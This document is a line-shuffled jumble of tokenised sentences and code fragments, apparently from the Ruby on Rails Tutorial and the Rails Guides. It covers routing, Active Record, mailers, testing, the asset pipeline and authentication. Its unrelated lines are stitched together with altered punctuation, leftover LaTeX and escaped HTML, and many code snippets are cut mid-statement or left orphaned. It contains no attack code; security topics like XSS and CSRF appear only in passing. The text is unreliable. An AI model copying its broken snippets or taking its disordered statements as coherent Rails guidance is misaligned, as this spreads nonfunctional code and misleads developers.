( Unfortunately , I don &apos;t have a personal recommendation here , but \ href { http : / / headfirstlabs ▖ com / books / hfhtml / } { \ emph { Head First HTML } } looks promising , and one reader recommends \ href { http : / / www ▖ amazon ▖ com / gp / product / 0596526873 } { \ emph { CSS : The Missing Manual } } by David Sawyer McFarland ▖ )
If your ╼ validation fails , you should add an error message to the model , therefore ╼ making it invalid .
A test for an invalid signup ▖
Before implementing user following and followers , we first need to establish the association between users and relationships .
* * * Don &apos;t Repeat Yourself : * * DRY is a principle of software development which ╼ states that &quot; Every piece of knowledge must have a single , unambiguous , authoritative ╼ representation within a system ▖ &quot;
That environment is no different than the default ones , start a server with `rails server -e staging` , a console with `rails console staging` , `Rails ▖ env ▖ staging ? ` works , etc .
We &apos;ll make do by adopting the convention that all fixture users have the same password ( \ kode { &apos; password &apos; } ) .
You might have noticed that Listing ~ \ ref { code : populator _ with _ admin } makes the user an admin by including \ kode { admin : true } in the initialization hash .
# # # Backends
&lt; % = f ▖ text _ field : author _ name % &gt;
UserMailer ▖ welcome _ email ( @ user ) ▖ deliver _ later
{ nil = &gt; nil , 1 = &gt; 1 , &quot; a &quot; = &gt; &quot; a &quot; } ▖ symbolize _ keys
Most migrations , including all the ones in the \ emph { Rails Tutorial } , are \ emph { reversible } , which means we can ``migrate down &apos; &apos; and undo them with a single Rake task , called \ kode { db : rollback } :
The engine is unable to find the partial required for rendering the comments ▖ ╼
( Now you know why the \ kode { before \ _ save } callback from Listing ~ \ ref { code : email _ downcase } uses \ kode { self ▖ email } instead of just \ kode { email } ▖ )
The view for the \ kode { help } action is analogous ( Listing ~ \ ref { code : raw _ help _ view } ) .
Now when confirmation validations fail , the error will be attached to ` : # { attribute } _ confirmation` instead of `attribute` .
If so , you can add a comment to the issue saying that you &apos;re seeing the same thing .
* himself or herself ▖ ▖ ▖ use themselves .
The ` @ article` object is available to any partials rendered in the view because ╼ we defined it as an instance variable .
Now you can simply do :
As shown in Listing ~ \ ref { code : preventing _ unactivated _ logins } , the way to do this is to log the user in as usual if \ kode { user ▖ activated ? } \ is true ; otherwise , we redirect to the root URL with a \ kode { warning } message ( Figure ~ \ ref { fig : not _ activated _ warning } ) .
&#124; `logger` &#124; Generates information on the mailing run if available ▖
You can specify static segments when creating a route by not prepending a colon to a fragment :
This indicates a missing template , which in the context of Rails is essentially the same thing as a view .
email = foo % 40example ▖ com
( As we &apos;ll see in detail starting in Chapter ~ \ ref { cha : modeling _ users } , this user data is stored in a database back-end ▖ )
If the action is not being used in a public API and you are free to change the ╼ HTTP method , you can update your route to use `patch` instead of `put` :
def set _ conditional _ cache _ control !
NOTE : Defined in `active _ support / core _ ext / object / blank ▖ rb` .
Ruby , like many object-oriented languages , uses \ emph { classes } to organize methods ; these classes are then \ emph { instantiated } to create objects .
It will look a little basic for now , but that &apos;s ok ▖
Use of a standard development environment in the cloud ( Section ~ \ ref { sec : up _ and _ running } ) , which sidesteps many of the problems associated with installing and configuring a new system
If the two match , then the submitted password is correct and the user is authenticated .
The ` : through` option specifies a join model through which to perform the query ▖
\ href { http : / / www ▖ michaelhartl ▖ com / } { Michael Hartl } is the author of the \ href { http : / / www ▖ railstutorial ▖ org / } { \ emph { Ruby on Rails Tutorial } } , one of the leading introductions to web development , and is a cofounder of the \ href { http : / / www ▖ softcover ▖ io / } { Softcover } self-publishing platform .
Back in `ArticlesController` , we need to change the `create` action ╼ to use the new `Article` model to save the data in the database ▖ ╼
For example `ActionMailer : : Base` defines :
&quot; p &quot; , &quot; q &quot; , &quot; r &quot; , &quot; s &quot; , &quot; t &quot; , &quot; u &quot; , &quot; v &quot; , &quot; w &quot; , &quot; x &quot; , &quot; y &quot; , &quot; z &quot; &#93;
* * N + 1 queries problem * *
A brief description of the application
NOTE : Defined in `active _ support / core _ ext / module / aliasing ▖ rb` .
We could call them \ emph { following } , but that &apos;s ambiguous : in normal English , a ``following &apos; &apos; is the set of people following \ emph { you } , i ▖ e ▖ , your followers---exactly the opposite of the intended meaning .
* FROM &quot; articles &quot;
In the final command , we use the \ kode { valid ? } \ method , which returns \ kode { false } when the object fails one or more validations , and \ kode { true } when all validations pass .
def name _ with _ initial
clients ▖ each do &#124; client &#124;
The user index page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users } { / users } ) with a second user .
% w ( 1 2 3 4 5 6 7 ) ▖ in _ groups ( 3 )
Open classing an Engine class ╼ redefines it for use in the main application ▖
page to show user
&#124; DELETE &#124; / photos / : id &#124; images # destroy &#124; photo _ path ( : id ) &#124;
$ heroku run console
-----------------------------------
( Compare to the password digest migration in Section ~ \ ref { sec : a _ hashed _ password } ▖ )
umerate } ╼ ╼ % subsection creating _ microposts ( end ) ╼ ╼ \ subsection { A proto-feed } % ( fold ) ╼ \ label { sec : a _ proto _ feed } ╼ ╼
# SELECT * FROM clients ORDER BY orders _ count ASC , created _ at DESC
encoding : &apos; SpecialEncoding &apos; ,
Recall that the id of the user is available in the \ kode { params &#91; : id &#93; } variable , which means that we can find the user with the code in Listing ~ \ ref { code : initial _ edit _ action } .
\ href { https : / / bitbucket ▖ org / account / signup / } { Sign up for a Bitbucket account } if you don &apos;t already have one .
The \ kode { save } method returns \ kode { true } if it succeeds and \ kode { false } otherwise .
`invalid ? ` is simply the inverse of `valid ? ` ▖
# = &gt; { 1 = &gt; 1 , nil = &gt; nil , : a = &gt; &quot; a &quot; }
Write an integration test for all the layout links , including the proper behavior for logged-in and non-logged-in users .
Thanks to reader Andy Philips for pointing out this issue and for encouraging me to fix the broken terminology ▖ )
before _ save : before _ save _ callback # GOOD
No notion of ``following &apos; &apos; or ``followed &apos; &apos;
Find the line beginning with `root` and ╼ uncomment it ▖
Our method for making static pages is probably the simplest , but it &apos;s not the only way .
# # # ` : allow _ nil`
server ▖ start
&lt; / span &gt;
With that , all of the routes for static pages are working , and the tests should pass :
Here &apos;s a summary of the pros and cons :
Commenting out a validation to ensure a failing test .
A filled-in form with \ kode { text } and \ kode { password } fields .
This is actually a convenient method which calls `content _ tag _ for` internally with ` : div` as the tag name ▖
* `active _ record ▖ initialize _ timezone` Sets `ActiveRecord : : Base ▖ time _ zone _ aware _ attributes` to true , as well as setting `ActiveRecord : : Base ▖ default _ timezone` to UTC ▖ When attributes are read from the database , they will be converted into the time zone specified by `Time ▖ zone` .
# Build JSON APIs with ease .
What is Action View ?
So , for our UserMailer example , if you have ╼ `welcome _ email ▖ text ▖ erb` and `welcome _ email ▖ html ▖ erb` in ╼ `app / views / user _ mailer` , Action Mailer will automatically send a multipart email ╼ with the HTML and text versions setup as different parts .
# # # Configuring Action Controller
$ rails server
&quot; table &quot; ▖ pluralize # = &gt; &quot; tables &quot;
By using the \ kode { log \ _ in \ _ as } method defined in Listing ~ \ ref { code : test _ helper _ log _ in } , we can test the \ kode { edit } and \ kode { update } actions as in Listing ~ \ ref { code : edit _ update _ wrong _ user _ tests } .
Meanwhile , the \ kode { alt } attribute is what will be displayed if the page is accessed by a program that can &apos;t display images ( such as screen readers for the visually impaired ) .
&lt; / h1 &gt;
The `find` method will raise an `ActiveRecord : : RecordNotFound` exception if no matching record is found .
# = &gt; ( 123 ) 555-1234
You can do this by configuring Rails to ╼ set your CDN as the asset host instead of using a relative path ▖
The result is shown in Listing ~ \ ref { code : create _ js _ erb } .
This is what prevents arbitrary users from granting themselves administrative access to our application .
We first invoke the console with \ kode { rails console } at the command line , and then retrieve the first user from the database using \ kode { User ▖ first } ( putting the results in the variable \ kode { first \ _ user } )
The cloud IDE recommended in Section ~ \ ref { sec : development _ environment } includes Git by default , so no installation is necessary in this case .
Seeding the database can be slow , and on some systems could take up to a few minutes .
In the next chapter , we &apos;ll build on the foundation from Chapter ~ \ ref { cha : beginners } to make a database-backed \ emph { toy app } , which will give us our first real taste of what Rails can do .
In Chapter ~ \ ref { cha : a _ toy _ app } , we &apos;ll make a second project , whose purpose is to demonstrate the basic workings of a Rails application .
arranges for the dependent microposts ( i ▖ e ▖ , the ones belonging to the given user ) to be destroyed when the user itself is destroyed .
* `update _ column`
respond _ to do &#124; format &#124;
# Message chaining
NOTE : The matcher ( and other members of the precompile array ; see below ) is ╼ applied to final compiled file names ▖
* How to properly organize your application assets .
One of the best things about the asset pipeline is that it automatically results in assets that are optimized to be efficient in a production application .
When writing ordinary Ruby , you often write modules and include them explicitly yourself , but in the case of a helper module Rails handles the inclusion for us .
Within an engine , there may come a time where you wish to use things such as ╼ initializers , internationalization or other configuration options ▖
( In fact , the \ href { http : / / railstutorial ▖ org } { Ruby on Rails Tutorial site } lives at Heroku ; if you &apos;re reading this book online , you &apos;re looking at a Heroku-hosted site right now ! )
This is a problem because ╼ this route goes to the very page that you &apos;re on right at the moment , and that ╼ route should only be used to display the form for a new article .
Extensions to `File`
That \ emph { is } what we want , and it leads to the \ kode { password \ _ reset \ _ expired ? } \ method in Listing ~ \ ref { code : user _ model _ password _ reset _ expired } .
# # # Bytes
This method takes a block that contains the content you wish to cache ▖
If you try to use more connections than are available , Active Record will block ╼ and wait for a connection from the pool ▖
We &apos;ll write simple tests for each of the titles in Table ~ \ ref { table : static _ pages } by combining the tests in Listing ~ \ ref { code : about _ test } with the \ kode { assert \ _ select } method , which lets us test for the presence of a particular HTML tag ( sometimes called a ``selector &apos; &apos; , hence the name )
Some references indicate that the view returns the HTML directly to the browser ( via a web server such as Apache or Nginx ) .
person ▖ errors &#91; : name &#93; # = &gt; &#91; &#93;
The \ emph { Ruby on Rails Tutorial } owes a lot to my previous Rails book , \ emph { RailsSpace } , and hence to my coauthor \ href { http : / / aure ▖ com / } { Aurelius Prochazka } .
When a form is submitted , the fields of the form are sent to Rails as ╼ _ parameters _ ▖
Admin ? : &lt; % = permission _ fields ▖ check _ box : admin % &gt;
Command
Only enabled when `config ▖ cache _ classes` is `false` .
Note that we can omit the \ kode { user \ _ url } in the redirect , writing simply \ kode { redirect \ _ to @ user } to redirect to the user show page .
Active Support augments the API of arrays to ease certain ways of accessing them ▖
Delete all ╼ of the existing code in the file , and replace it with the following single line ╼ of code :
You should see the Rails default information page :
The login form .
&lt; % = stylesheet _ link _ tag &quot; blorgh / style ▖ css &quot; % &gt;
By representing the `author` association &apos;s object with the `User` class , a link ╼ is established between the engine and the application ▖
Then reset the database and re-populate the sample data :
&lt; % = render &quot; shared / ad _ banner &quot; % &gt;
You can also use this method on your own ▖ `valid ? ` triggers your validations ╼ and returns true if no errors were found in the object , and false otherwise .
Produces
has _ many : subordinates , class _ name : &quot; Employee &quot; ,
╼ $ rails console ╼ &gt; &gt; 1 ▖ year ▖ from _ now ╼ = &gt; Sun , 09 Aug 2015 16 : 48 : 17 UTC + 00 : 00 ╼ &gt; &gt; 10 ▖ weeks ▖ ago ╼ = &gt; Sat , 31 May 2014 16 : 48 : 45 UTC + 00 : 00
The first method , `find _ each` , retrieves a batch of records and then yields _ each _ record to the block individually as a model ▖
The `last` method returns `nil` if no matching record is found and no exception will be raised .
def before _ save _ callback
( We &apos;ll make the last one in Chapter ~ \ ref { cha : sign _ in _ sign _ out } ▖ )
Behind the scenes , this means extracting the primary key from this object and setting the associate object &apos;s foreign key to the same value .
* Use Rails idioms and helpers .
This helper validates attributes against a block ▖
* &#91; Rack API Documentation &#93; ( http : / / rack ▖ github ▖ io / )
You can get the actual class object invoking `constantize` on it , explained next .
use this style :
This is because both \ kode { a } and \ kode { b } point to the same array .
def find _ by _ order _ prefix ( order _ number )
Article with Comments &#93; ( images / getting _ started / article _ with _ comments ▖ png )
Some parts of Rails can also be configured externally by supplying environment variables ▖
The `collection ▖ build` method returns a new object of the associated type ▖
Instead , we can arrange for a sequence of names and email addresses using the \ kode { sequence } method :
errors ▖ add ( : expiration _ date , &quot; can &apos;t be in the past &quot; )
layout : products _ layout
create app / assets / javascripts / microposts ▖ js ▖ coffee
in Listing ~ \ ref { code : utility _ method _ tests } .
&#124; &#124; 202 &#124; : accepted &#124;
# # # # Rendering JSON
Ruby on Rails ╼ Tutorial
WARNING : If the ` : prefix` option is `true` this is less generic , see below .
This helper validates that your attributes have only numeric values ▖
( Currently , all saves should succeed because there are as yet no validations ; we &apos;ll see cases in Section ~ \ ref { sec : user _ validations } when some will fail ▖ )
The `order` method dictates the order in which associated objects will be received ( in the syntax used by an SQL `ORDER BY` clause ) .
# Forgets a persistent session .
Unless you have a &quot; Code Red , Mission Critical , the World is Coming to an End &quot; kind of bug , you &apos;re creating this issue report in the hope that others with the same problem will be able to collaborate with you on solving it ▖
The \ kode { belongs \ _ to } relationship between a micropost and its user .
in Listing ~ \ ref { code : correct _ signin _ failure _ test } .
This can include amending existing commits ▖
Just like controllers , any instance variables we define in the method become ╼ available for use in the views .
* `lib / assets` is for your own libraries &apos; code that doesn &apos;t really fit into the ╼ scope of the application or those libraries which are shared across applications .
This arranges to show a standard error page during the deployment and migration .
image _ url ( &quot; edit ▖ png &quot; ) # = &gt; http : / / www ▖ example ▖ com / assets / edit ▖ png
Testing the remember branch
# # # # Configuring a PostgreSQL Database for JRuby Platform
This is possible by specifying the `includes` method of the `Model ▖ find` call ▖
* FROM &quot; users &quot; WHERE &quot; users &quot; ▖ &quot; state &quot; = &apos; active &apos; AND &quot; users &quot; ▖ &quot; state &quot; = &apos; inactive&apos;
array # = &gt; &#91; &apos; foo &apos; &#93;
has _ one : account , class _ name : &quot; Billing &quot; , dependent : : nullify
* * Adding * * `Article # time _ since _ created` :
( We &apos;ll be using only one for now , but we &apos;ve put in the others for future reference ▖ )
As in Section ~ \ ref { sec : hello _ world } and Section ~ \ ref { sec : mvc _ in _ action } , this involves editing the \ kode { routes ▖ rb } file to connect / to a page of our choice , which in this case will be the Home page .
Because the before filter operates on a per-action basis , we &apos;ll put the corresponding tests in the Users controller test ▖ The plan is to hit the \ kode { edit } and \ kode { update } action with the right kinds of requests and verify that the flash is set and that the user is redirected to the login path .
mail ( to : email _ with _ name , subject : &apos; Welcome to My Awesome Site &apos; )
Adding a test for the signup page is left as an exercise ( Section ~ \ ref { sec : exercises _ rails _ routes } ▖ )
&lt; % = user _ url ( @ user , host : &apos; example ▖ com &apos; ) % &gt;
Another source of duplication appears in each example ; we have both
To get help on this sample app , see the
This object , of course , should have ╼ some sort of identifier by which it can be referenced .
@ users = User ▖ all
Let &apos;s take a look at it ( Listing ~ \ ref { code : default _ controller _ test } ) .
render template : &quot; books / edit &quot;
* FROM `users` WHERE `users` ▖ `id` = 1
( You won &apos;t actually see the color green unless you add MiniTest reporters in the optional Section ~ \ ref { sec : minitest _ reporters } ▖ )
To accomplish this feat , we will need some fairly advanced Rails , Ruby , and even SQL programming techniques .
redirect _ to ( @ book )
The beginning is different , though ; unlike account activation , implementing password resets requires both a change to one of our views and two new forms ( to handle email and new password submission ) .
The `extending` method specifies a named module to extend the association proxy ▖
* `config ▖ action _ mailer ▖ interceptors` registers interceptors which will be called before mail is sent .
2 rows in set ( 0 ▖ 00 sec )
Otherwise , if the return value contains a XSS string , the malicious code will be executed upon return to the browser ▖
&lt; b &gt; Zone name &lt; / b &gt; &lt; br &gt;
Here the \ kode { header } tag indicates elements that should go at the top of the page .
There &apos;s a special method for testing for \ kode { nil } -ness , which you might be able to guess :
For example , you might have a view that looks like this :
But the complexity and sheer amount of code in the scaffolding can be utterly overwhelming to a beginning Rails developer ; you may be able to use it , but you probably won &apos;t understand it .
The \ kode { flash ▖ now } method is used for flash messages on rendered pages .
* `config ▖ action _ controller ▖ default _ charset` specifies the default character set for all renders ▖
When a user requests a password reset , find the user by the submitted email address .
s ▖ add _ dependency &quot; moo &quot;
By running the test suite , verify that the implementations in Listing ~ \ ref { code : token _ digest _ self } ( slightly confusing ) and Listing ~ \ ref { code : token _ digest _ class _ self } ( extremely confusing ) are correct .
adapter : jdbcpostgresql
&quot; bar &quot; : &quot; baz &quot;
a2 = A ▖ new
# : uglifier config ▖ assets ▖ css _ compressor = : yui
It is possible , though , using a special test method called \ kode { assigns } .
&lt; % = comment ▖ commenter % &gt;
def # { severity ▖ downcase } ?
Throughout the rest of this chapter , you might find it helpful to consult the \ href { http : / / ruby-doc ▖ org / } { Ruby API } ▖ It &apos;s packed ( perhaps even \ emph { too } packed ) with information ; for example , to learn more about Ruby strings you can look at the Ruby API entry for the \ kode { String } class .
To test the behavior from Listing ~ \ ref { code : login _ upon _ signup } , we can add a line to the test from Listing ~ \ ref { code : a _ test _ for _ valid _ submission } to check that the user is logged in .
# # # # JavaScript / CoffeeScript and ERB
Notice the use of the \ kode { picture ? } \ boolean method to prevent displaying an image tag when there isn &apos;t an image .
Of course , requiring users to sign in isn &apos;t quite enough ; users should only be allowed to edit their \ emph { own } information .
You can also extend these objects through anonymous modules , adding new finders , creators , or other methods ▖
NOTE : Regular forms generate hidden fields so they do not use these tags ▖
&lt; a href = &quot; # &quot; onclick = &quot; paintIt ( this , &apos; # 000099 &apos; , &apos; # FFFFFF &apos; ) &quot; &gt; Paint it blue &lt; / a &gt;
Please use the contents of any existing file in `config / environments` as a starting point and make the necessary changes from there .
Age : 885814
Web browsers can &apos;t actually issue \ texttt { DELETE } requests ; Rails fakes it with JavaScript .
Adding an \ kode { authenticated ? } \
Rails 4 ▖ 1 evaluates each fixture &apos;s ERB in a separate context , so helper methods ╼ defined in a fixture will not be available in other fixtures .
@ article = Article ▖ new ( article _ params )
has _ one : guest
With this substitution , the corrected application code appears as in Listing ~ \ ref { code : correct _ signin _ failure } .
You can force it to use Builder instead with the ` : type` option :
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
The final piece of the puzzle is to verify that a given remember token matches the user &apos;s remember digest , and in this context there are a couple of equivalent ways to use bcrypt to verify a match .
We can now start \ kode { guard } as follows :
( Having so much code in each branch of the \ kode { if } - \ kode { else } conditional is a bit messy , and cleaning it up using partials is left as an exercise ( Section ~ \ ref { sec : exercises _ creating _ microposts } ) ▖ )
The final implementation of \ kode { from \ _ users \ _ followed \ _ by } .
When you call `form _ for` , you pass it an identifying object for this ╼ form ▖
To do this , change the `new` and `create` actions inside ╼ `app / controllers / articles _ controller ▖ rb` to these :
User ▖ where ( weekly _ subscriber : true ) ▖ find _ each do &#124; user &#124;
In addition , passing in a raw \ kode { params } hash as above will cause an error to be raised , so that Rails applications are now immune to mass assignment vulnerabilities by default .
( Even testing for the right key , much less the text , is likely to be brittle , so I prefer only to test that the flash isn &apos;t empty ▖ )
{ nil = &gt; nil , 1 = &gt; 1 , &quot; nested &quot; = &gt; { &quot; a &quot; = &gt; 3 , 5 = &gt; 5 } } ▖ deep _ symbolize _ keys
Of course , knowledge of this inheritance doesn &apos;t do any good unless we know what \ kode { ActiveRecord : : Base } contains , so let &apos;s get started with some concrete examples .
The \ kode { current _ user ? }
`ActiveRecord : : Base # to _ param` returns the `id` of a model , but you can redefine that method in your models ▖
% w ( a b c d ) ▖ third # = &gt; c
This example is taken from `ActionDispatch : : Http : : Cache : : Response` :
This shows how to run a specific test within a test file by passing the option
WARNING ▖ Note that the regular expression above allows a trailing newline ╼ character .
# # # `atomic _ write`
group ( &quot; date ( created _ at ) &quot; ) ▖ having ( &quot; sum ( price ) &gt; ? &quot; , 100 )
Docrails is only used for isolated documentation improvements .
( Note that \ kode { eq } is an RSpec method to test equality ▖ )
if options &#91; : fields &#93; ▖ any ? {
does the trick in this case ▖ )
has _ many : ads
ice ? ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-d0bbfe &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection using _ form _ for ( end ) ╼ ╼ \ subsection { Signup form HTML } % ( fold ) ╼ \ label { sec : the _ form _ html } ╼ ╼
* `autobuffer : true` , the video will pre load the file for the user on page load .
&#124; GET &#124; / sekret / comments / : id ( ▖ : format ) &#124; comments # show &#124; comment _ path &#124;
If the string evaluates to no known constant , or its content is not even a valid constant name , `constantize` raises `NameError` .
But visiting the edit page only tests the authorization for the \ kode { edit } action , not for \ kode { update } .
In particular , because we access microposts through their associated users , both the \ kode { create } and \ kode { destroy } actions must require users to be logged in .
No problem , you can easily override ╼ the default conventions .
strip _ tags ( &quot; &lt; b &gt; Bold &lt; / b &gt; no more !
Despite its apparent simplicity , making static pages is a highly instructive exercise , rich in implications---a perfect start for our nascent application .
create app / controllers / users _ controller ▖ rb
# # # # Set up a CDN to Serve Static Assets
Now get busy and add / edit code ▖
Resource Routing : the Rails Default
Strings also respond to the \ kode { empty ? } \ method :
The two lines in Listing ~ \ ref { code : bootstrap _ css } include the entire Bootstrap CSS framework .
Built-in Helpers
Defining a \ kode { gravatar \ _ for } helper method .
Finding a user to follow ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / page _ flow _ user _ index _ mockup _ bootstrap-full ▖ png } { ( full size ) }
The full data model represented by the migration in Listing ~ \ ref { code : users _ migration } is shown in Figure ~ \ ref { fig : user _ model _ initial } .
Adding image upload to the micropost create form .
There is a wealth of Rails resources in stores and on the web---indeed , the supply is so rich that it can be overwhelming .
The public path that Sprockets uses by default is ` / assets` .
To make the password digest , \ kode { has \ _ secure \ _ password } uses a state-of-the-art hash function called \ href { http : / / en ▖ wikipedia ▖ org / wiki / Bcrypt } { bcrypt } .
Sign in
To update our database with the new data model , we need to run a migration as in Section ~ \ ref { sec : demo _ users _ resource } :
As with the \ kode { admin } attribute ( Listing ~ \ ref { code : admin _ migration } ) , we &apos;ll add a default boolean value of \ kode { false } to the \ kode { activated } attribute , as shown in in Listing ~ \ ref { code : add _ activation _ to _ users _ migration } .
now ▖ all _ week
Or , &quot; whaaat my tests are failing ! ! ! ? &quot;
The corresponding partial appears in Listing ~ \ ref { code : micropost _ partial } .
containing the name of the test ▖ ( A test &apos;s name is just the word ``test &apos; &apos; and the words in the test description joined using underscores ▖ )
Produce a string representation of a number in delimited form :
Incidentally , the order of the sample users in Figure ~ \ ref { fig : heroku _ sample _ users } may vary , and on my system doesn &apos;t match the local version from Figure ~ \ ref { fig : user _ index _ pagination } ; this is because we haven &apos;t specified a default ordering for users when retrieved from the database , so the current order is database-dependent .
The user profile ( \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } ) with microposts ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ profile _ with _ microposts _ bootstrap-full ▖ png } { ( full size ) }
invoke jbuilder
But what if you want to reload the cache , because data might have been changed by some other part of the application ?
private
In particular , we want to change the default page , the \ emph { root route } , which determines the page that is served on the \ emph { root URL } .
Along the way , we &apos;ll learn about populating the database with sample users and \ emph { paginating } the user output so that the index page can scale up to display a potentially large number of users .
After submitting the form , push up your first application as follows :
The ` : source _ type` option specifies the source association type for a `has _ many : through` association that proceeds through a polymorphic association .
assemblies ▖ create ! ( attributes = { } )
use Rack : : Head
When you declare a `belongs _ to` association , the declaring class automatically gains five methods related to the association :
╼ ( Not Yet Implemented )
To see the results of the templates defined in Listing ~ \ ref { code : account _ activation _ view _ text } and \ linebreak Listing ~ \ ref { code : account _ activation _ view _ html } , we can use \ emph { email previews } , which are special URLs exposed by Rails to let us see what our email messages look like .
There &apos;s an important difference , though ; Ruby won &apos;t interpolate into single-quoted strings :
&lt; % = f ▖ text _ field : name % &gt;
atom _ feed do &#124; feed &#124;
Using the \ kode { full \ _ title } helper in a test ▖
This will return a number ( possibly a floating point number such as 3 ▖ 14159265 ) representing the average value in the field .
To make some actual microposts , we enter information at the new microposts page , \ href { http : / / localhost : 3000 / microposts / new } { / microposts / new } , as seen in Figure ~ \ ref { fig : demo _ new _ micropost } .
# &lt; authored-timestamp type = &quot; datetime &quot; &gt; 2009-09-02T16 : 44 : 36Z &lt; / authored-timestamp &gt;
For example , on my system I visited the URL
If the parent object ( the one declaring the `has _ and _ belongs _ to _ many` association ) is unsaved ( that is , `new _ record ? ` returns `true` ) then the child objects are not saved when they are added ▖
This would cause the routing to recognize paths such as :
NOTE : The example above uses a custom environment called &quot; staging &quot; for a ╼ production like server but for testing purposes ▖
* In general , views will be rendered in the `main` layout
&#124; POST &#124; / photos &#124; images # create &#124; photos _ path &#124;
The view for the user index .
( For more on \ kode { curl } , see \ href { http : / / conqueringthecommandline ▖ com / book / curl } { Chapter 3 of \ emph { Conquering the Command Line } } ▖ )
* `after _ remove`
# # # # `deep _ merge` and `deep _ merge !
validates : bio , length : { maximum : 500 }
# # # Duplicating
gem &apos; therubyracer&apos;
in Listing ~ \ ref { code : initial _ create _ session } .
( \ emph { Note } : If you completed the exercise corresponding to Listing ~ \ ref { code : base _ title _ test } , you should retain the \ kode { setup } method defining the \ kode { @ base \ _ title } variable ▖ )
do _ stuff
Returning to the console , we can see the effect of \ kode { has \ _ secure \ _ password } from Listing ~ \ ref { code : password _ implementation } by looking at the \ kode { password \ _ digest } attribute :
* The &#91; # rubyonrails &#93; ( irc : / / irc ▖ freenode ▖ net / # rubyonrails ) channel on irc ▖ freenode ▖ net
As you can see , the \ kode { map } method returns the result of applying the given block to each element in the array or range .
class Picture &lt; ActiveRecord : : Base
invoke test _ unit
Note that this block _ will _ be run for rake tasks ▖
# # # # # ` : through`
We &apos;ll start with the existing user :
( If the repetition of the base title ``Ruby on Rails Tutorial Sample App &apos; &apos; bothers you , see the exercises in Section ~ \ ref { sec : static _ pages _ exercises } ▖ )
# Generates a select field for days that defaults to the number given
If you want to find the sum of a field for all records in your table you can call the `sum` method on the class that relates to the table ▖
&lt; % = submit _ tag &apos; Create &apos; % &gt;
create app / views / microposts / index ▖ json ▖ jbuilder
Let &apos;s add a method called `welcome _ email` , that will send an email to the user &apos;s ╼ registered email address :
in Listing ~ \ ref { code : general _ authenticated _ p } .
In our case , the About page will first need an action called \ kode { about } in the StaticPages controller .
Although the same partial will be rendered into both views , Action View &apos;s submit helper will return &quot; Create Zone &quot; for the new action and &quot; Update Zone &quot; for the edit action .
# # # Ajax Injection
They could redirect to a phishing site that looks the same as yours , but ask to login again ( and sends the login credentials to the attacker ) ▖
First , we will need to know about the dollar-sign syntax to access a DOM element based in its unique CSS ~ id .
If your application is using an &quot; / assets &quot; route for a resource you may want change the prefix used for assets to avoid conflicts :
First-time repository setup
# # # Method Delegation
( Compare this to the original generation of the \ kode { users } table in Listing ~ \ ref { code : generate _ user _ model } , which included the arguments \ kode { name : string } and \ kode { email : string } ▖ )
Just like `where` clauses scopes are merged using `AND` conditions .
NOTE : Because you might want to use the same controller for a singular route ( ` / account` ) and a plural route ( ` / accounts / 45` ) , singular resources map to plural controllers ▖
# # # # collection _ check _ boxes
Since gems with different version numbers sometimes conflict , it is often convenient to create separate \ emph { gemsets } , which are self-contained bundles of gems .
When learning about classes , it &apos;s useful to find out the \ emph { class hierarchy } using the \ kode { superclass } method :
This includes linking to a blank string ▖
/ microposts / 1
In order to get the user show view to work , we need to define an \ kode { @ user } variable in the corresponding \ kode { show } action in the Users controller .
wrong password
in Listing ~ \ ref { code : full _ title _ helper _ tests } .
The more prepared statements in use : the more memory your database will require ▖
To display the users themselves , we need to make a variable containing all the site &apos;s users and then render each one by iterating through them in the index view .
Adding code to test the contents of the About page .
* * `ActionDispatch : : ParamsParser` * *
For example , `type` is a reserved keyword used to designate a table using Single Table Inheritance ( STI ) ▖
How detailed you want to make your tests is up to you ; a suggested template appears in Listing ~ \ ref { code : flash _ test } .
NOTE : Defined in `active _ support / core _ ext / enumerable ▖ rb` .
create _ customer !
It &apos;s also useful for inserting tags that load page-specific JavaScript or css files into the header of an otherwise generic layout .
Engines and ╼ applications also share a common structure .
If you find yourself getting bogged down by the tests , I suggest either skipping them on a first reading or ( even better ) using them as a tool to verify your code &apos;s correctness without worrying about how they work .
Because we won &apos;t necessarily have access to a user object when calculating the digest ( as will be the case in the fixtures file ) , we &apos;ll attach the \ kode { digest } method to the User class itself , which ( as we saw briefly in Section ~ \ ref { sec : constructors } ) makes it a \ emph { class method } .
If you want them to run in other environments consult the
# You cannot reach it via the constant M because it does not even exist .
So , to get the test suite passing again , we just need to add a password and its confirmation , as shown in Listing ~ \ ref { code : test _ with _ password _ confirmation } .
This example assumes you are using Ruby ~ 1 ▖ 9 ▖ 3 .
This uses the \ kode { have \ _ title } method , which checks for an HTML title with the given content .
Create a micropost ( \ kode { user \ _ id = user ▖ id } ) .
else
page to edit micropost with id \ kode { 1 }
create app / views / microposts / index ▖ html ▖ erb
email = michael % 40michaelhartl ▖ com &quot; &gt; Activate &lt; / a &gt; ╼ ---- = = _ mimepart _ 5407704656b50 _ 61d3fd1914f4cd02996a--
They are important , though , and I suggest learning about them using one of the Ruby books recommended in Section ~ \ ref { sec : comments _ for _ various _ readers } .
The signup form \ href { http : / / localhost : 3000 / signup } { / signup } for new users ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ form _ bootstrap-full ▖ png } { ( full size ) }
When you declare a `has _ many` association , the declaring class automatically gains 16 methods related to the association :
The way to change the links in the site layout involves using an ╼ if-else statement inside embedded Ruby to show one set of links if the user is logged in and another set of links otherwise :
&quot; dude &quot; ▖ pluralize ( 0 ) # = &gt; &quot; dudes &quot;
This code arranges to include the application stylesheet and JavaScript , which are part of the asset pipeline ( Section ~ \ ref { sec : the _ asset _ pipeline } ) , together with the Rails method \ kode { csrf \ _ meta \ _ tags } , which prevents \ href { http : / / en ▖ wikipedia ▖ org / wiki / Cross-site _ request _ forgery } { cross-site request forgery } ( CSRF ) , a type of malicious web attack .
\ emph { Hint } : See the \ href { http : / / railscasts ▖ com / episodes / 270-authentication-in-rails-3-1 } { RailsCast on authentication in Rails ~ 3 ▖ 1 } , and note in particular the change in the structure of the \ kode { params } hash .
With these techniques in hand , we are well-equipped to recover from the inevitable development \ href { http : / / en ▖ wikipedia ▖ org / wiki / SNAFU } { snafus } .
Since GitHub charges for private repositories while Bitbucket offers an unlimited number for free , for our purposes Bitbucket is a better fit than GitHub .
